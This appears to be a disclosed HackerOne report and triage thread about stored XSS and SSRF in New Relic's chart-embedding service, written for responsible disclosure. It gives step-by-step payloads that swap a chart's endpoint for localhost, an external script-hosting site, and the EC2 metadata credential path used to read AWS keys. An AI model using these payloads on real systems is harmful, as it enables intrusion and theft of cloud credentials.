title: Unsafe charts embedding implementation leads to cross-account stored XSS and SSRF
vulnerability_information:
Hey team,

I've discovered an improper user-input filtration issue at charts embedding (herald.service.newrelic.com) leading to both cross-account stored XSS and SSRF.

There is an action `Get chart link` for some charts (for instance, for the ones located at Mobile -> Overview).
{F600887}
After user clicks this link, the following request is sent:
```http
PUT /charts HTTP/1.1
Host: herald.service.newrelic.com
<redacted>

{"account_id":2385914,"chart_type":"area","metadata":{"title":"Crashes","subtitle":"test"},"endpoint":"/v2/nrql","query":{"account_id":2385914,"nrql":"SELECT count(*) FROM MobileCrash WHERE (appId = 194687300 OR appVersionId = 194687300) WHERE crashFingerprint NOT IN () FACET `appVersion` TIMESERIES SINCE 3 days AGO LIMIT 5"}}
```
At this step, the server saves the `endpoint` and `query` params to the database, and returns back the UUID of created publicly-available chart:
```http
HTTP/1.1 201 Created
<redacted>
Location: /charts/501c881b-7317-47a1-b2df-16f83fb0bb8d
<redacted>
```
Then, when a user visits page
`https://chart-embed.service.newrelic.com/herald/501c881b-7317-47a1-b2df-16f83fb0bb8d`
to see an embedded chart, the browser sends one more request to
`https://herald.service.newrelic.com/charts/501c881b-7317-47a1-b2df-16f83fb0bb8d/data`
to receive the chart data.

**Here is where an issue lies.** When the `.../data` request is processed by server, the server gets the corresponding `endpoint` and `query` params from the database, **makes an HTTP POST request** to this endpoint (with all the parameters from `query` parameter) and returns its content back to user. The vulnerability itself is that the server do not properly checks the `endpoint` parameter before save it to the database, and **attacker can submit the external URL here**.

Thus, an attacker can:
- interact with your internal network (through submitting the `localhost` URL or some other internal one) by sending arbitrary POST requests to it;
- craft malicious URL `https://herald.service.newrelic.com/charts/501c881b-7317-47a1-b2df-16f83fb0bb8d/data` which returns arbitrary HTML from external malicious resource, which leads to stored XSS in its turn.

##Steps to reproduce
1) Sign into Mobile
2) Navigate to any app -> Overview
3) Click the "three dots" near any chart (it even can be empty), choose the `Get chart link` menu item, and intercept the PUT-request to `https://herald.service.newrelic.com/charts` with Burp
**SSRF**
4) Change the `endpoint` parameter to `//localhost` and send the request
5) Copy the created chart ID from response `Location` header
6) Navigate to `https://herald.service.newrelic.com/charts/<CHART_ID>/data` and make sure the response contains the content of some webserver running at the herald VM at 80 port:
{F600890}
If you submit some closed port, the response will be 404.
**XSS**
4) Place an HTML-file with the following content at some internet (external) webserver:
```html
<script>alert(document.domain)</script>
```
You can use the file, I'm serving myself: https://xn--1xa.su/xss.html 
5) Change the `endpoint` parameter to your payload file location (`//xn--1xa.su/xss.html`) and send the request
6) Copy the created chart ID from response `Location` header
7) Navigate to `https://herald.service.newrelic.com/charts/<CHART_ID>/data` and make sure the XSS payload is executed:
{F600895}
It's severe that an attacker can send this malicious link to any user from any account and the XSS payload will fire, so it's **cross-account stored XSS**.

##PoC video
{F600905}

## Impact

- Full-fledged SSRF with ability to send arbitrary POST-requests to internal hosts
- Cross-account stored XSS
vulnerability_information_html:
Hey team,

I've discovered an improper user-input filtration issue at charts embedding (herald.service.newrelic.com) leading to both cross-account stored XSS and SSRF.

There is an action Get chart link for some charts (for instance, for the ones located at Mobile -> Overview).

After user clicks this link, the following request is sent:

PUT /charts HTTP/1.1
Host: herald.service.newrelic.com
<redacted>

{"account_id":2385914,"chart_type":"area","metadata":{"title":"Crashes","subtitle":"test"},"endpoint":"/v2/nrql","query":{"account_id":2385914,"nrql":"SELECT count(*) FROM MobileCrash WHERE (appId = 194687300 OR appVersionId = 194687300) WHERE crashFingerprint NOT IN () FACET `appVersion` TIMESERIES SINCE 3 days AGO LIMIT 5"}}

At this step, the server saves the endpoint and query params to the database, and returns back the UUID of created publicly-available chart:

HTTP/1.1 201 Created
<redacted>
Location: /charts/501c881b-7317-47a1-b2df-16f83fb0bb8d
<redacted>

Then, when a user visits page
https://chart-embed.service.newrelic.com/herald/501c881b-7317-47a1-b2df-16f83fb0bb8d
to see an embedded chart, the browser sends one more request to
https://herald.service.newrelic.com/charts/501c881b-7317-47a1-b2df-16f83fb0bb8d/data
to receive the chart data.

Here is where an issue lies. When the .../data request is processed by server, the server gets the corresponding endpoint and query params from the database, makes an HTTP POST request to this endpoint (with all the parameters from query parameter) and returns its content back to user. The vulnerability itself is that the server do not properly checks the endpoint parameter before save it to the database, and attacker can submit the external URL here.

Thus, an attacker can:

  • interact with your internal network (through submitting the localhost URL or some other internal one) by sending arbitrary POST requests to it;
  • craft malicious URL https://herald.service.newrelic.com/charts/501c881b-7317-47a1-b2df-16f83fb0bb8d/data which returns arbitrary HTML from external malicious resource, which leads to stored XSS in its turn.

Steps to reproduce

1) Sign into Mobile
2) Navigate to any app -> Overview
3) Click the "three dots" near any chart (it even can be empty), choose the Get chart link menu item, and intercept the PUT-request to https://herald.service.newrelic.com/charts with Burp
SSRF
4) Change the endpoint parameter to //localhost and send the request
5) Copy the created chart ID from response Location header
6) Navigate to https://herald.service.newrelic.com/charts/<CHART_ID>/data and make sure the response contains the content of some webserver running at the herald VM at 80 port:

If you submit some closed port, the response will be 404.
XSS
4) Place an HTML-file with the following content at some internet (external) webserver:

<script>alert(document.domain)</script>

You can use the file, I'm serving myself: https://xn--1xa.su/xss.html
5) Change the endpoint parameter to your payload file location (//xn--1xa.su/xss.html) and send the request
6) Copy the created chart ID from response Location header
7) Navigate to https://herald.service.newrelic.com/charts/<CHART_ID>/data and make sure the XSS payload is executed:

It's severe that an attacker can send this malicious link to any user from any account and the XSS payload will fire, so it's cross-account stored XSS.

PoC video

Impact

  • Full-fledged SSRF with ability to send arbitrary POST-requests to internal hosts
  • Cross-account stored XSS

activities.message:
You can submit the following URL as `endpoint`:
`//169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`
and then see that attacker can interact with your internal Amazon EC2 API, read your secret access key and token:
{F600912}
The "AccessKeyId", "SecretAccessKey" and "Token" then could be use to **gain full access to your AWS/EC2**, manage your VMs and so on. Thus, the **severity maybe should be bumped up**, but it's only your decision of course.
You can read further about severity of this issue here:
https://medium.com/poka-techblog/privilege-escalation-in-the-cloud-from-ssrf-to-global-account-administrator-fd943cf5a2f6
activities.markdown_message:

//169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
and then see that attacker can interact with your internal Amazon EC2 API, read your secret access key and token:

The "AccessKeyId", "SecretAccessKey" and "Token" then could be use to gain full access to your AWS/EC2, manage your VMs and so on. Thus, the severity maybe should be bumped up, but it's only your decision of course.
You can read further about severity of this issue here:
https://medium.com/poka-techblog/privilege-escalation-in-the-cloud-from-ssrf-to-global-account-administrator-fd943cf5a2f6

activities.message:
Just navigate here to see all the Amazon secrets, which could be leaked:
https://herald.service.newrelic.com/charts/19bf02a1-d9e4-4dac-8b43-d47d5c78405e/data

activities.message:
Hey team,

I was wrong a little here:
> The "AccessKeyId", "SecretAccessKey" and "Token" then could be use to gain full access to your AWS/EC2, manage your VMs and so on.

Actually, the things attacker can do with these keys depend on the vulnerable app permissions. So attacker can gain all permissions, the application have. 
I'll try to check this app permissions and notify you about my research.
activities.markdown_message:
Hey team,

I was wrong a little here:

The "AccessKeyId", "SecretAccessKey" and "Token" then could be use to gain full access to your AWS/EC2, manage your VMs and so on.

Actually, the things attacker can do with these keys depend on the vulnerable app permissions. So attacker can gain all permissions, the application have.
I'll try to check this app permissions and notify you about my research.

activities.message:
I think it can be possibly escalated up to RCE, but I should research this further.
P.S.: It's tricky a little because I'm not familiar with AWS API, so it can take a while.

If you don't need for my deeper diving, please let me know.

activities.message:
Hi @skavans,

Thanks for your report.

We're taking a look at this now, please refrain from any additional testing. We'll let you know as soon as we've forwarded this to our engineering teams.

activities.message:
Hi @skavans,

Thank you for brining this to our attention.

I have now logged this with the appropriate engineering teams for remediation.

As always, thank you for helping make New Relic safer!
Joe

activities.message:
Hey @jmcevoy,

Thank you for bounty! Im surprised a little with such low reward amount though. This is full-fledged SSRF (Ive demonstrated the AWS tokens leakage with potential to increase the impact to the RCE, but you asked me to stop diving) and the most impactful XSS Ive found (cross-account and embeddable). Can you please explain your reward decision? Should I try to further escalate this to RCE? Even a simple stored XSS (not embeddable, not cross-account) is usually rewarded with $2500.
activities.markdown_message:

activities.message:
Hi @skavans,

This report has been triaged as a "High".

The award granted is in line with our bug bounty program.

https://hackerone.com/newrelic

{F614240}

Having said that we have in some cases in the past awarded higher than this depending on the specifics of the report/vulnerability.

In this case due to the large amount of work you have undergone for this, the number of vulnerabilities listed and the great clarity you have included in the report I'm willing to award an additional bonus of $500 in this case.

Thanks again for all your hard work!,
Joe

Hi @skavans , this looks resolved to me, as I am getting errors back from the server when trying your payloads. If you believe you have a workaround feel free to let us know in this ticket and we can re-evaluate from there. Thanks!
